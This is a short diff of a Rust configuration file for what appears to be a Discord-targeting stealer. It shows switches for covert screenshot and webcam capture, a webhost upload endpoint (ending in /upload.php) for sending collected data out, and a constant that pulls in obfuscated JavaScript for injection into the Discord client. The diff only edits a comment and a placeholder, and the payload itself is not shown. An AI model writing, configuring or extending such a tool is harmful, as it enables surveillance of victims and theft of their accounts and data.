@@ -43,8 +43,8 @@ pub const SCREENSHOT: bool = false;
 // Takes a webcam image (self explanatory)
 pub const WEBCAM_IMAGE: bool = false;
 
-// Change this to your webhost
-pub const WEBHOST: &'static str = "[ENTER-WEBHOST]";
+// Change this to your webhost (make sure it ends with /upload.php)
+pub const WEBHOST: &'static str = "ENTER-WEBHOST";
 
 // Code to inject to discord (obfuscated with https://www.preemptive.com/products/jsdefender/online-javascript-obfuscator-demo/)
 pub const INJECT_CODE: &'static str = include_str!("../res/inject.js");
